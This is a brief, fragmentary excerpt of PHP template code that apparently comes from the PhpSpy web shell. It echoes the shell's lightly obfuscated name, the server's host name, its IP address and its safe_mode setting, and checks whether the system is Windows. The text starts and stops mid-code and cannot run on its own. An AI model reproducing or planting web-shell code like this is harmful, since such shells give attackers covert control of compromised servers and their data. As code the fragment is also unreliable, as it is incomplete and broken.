...
?><?php echo str_replace('.','','P.h.p.S.p.y');?><?php echo str_replace('.','','P.h.p.S.p.y');?><?php echo $_SERVER['HTTP_HOST'];?><?php echo gethostbyname($_SERVER['SERVER_NAME']);?><?php echo getcfg('safe_mode');?><?php if (!IS_WIN) {?><?php }?><?php
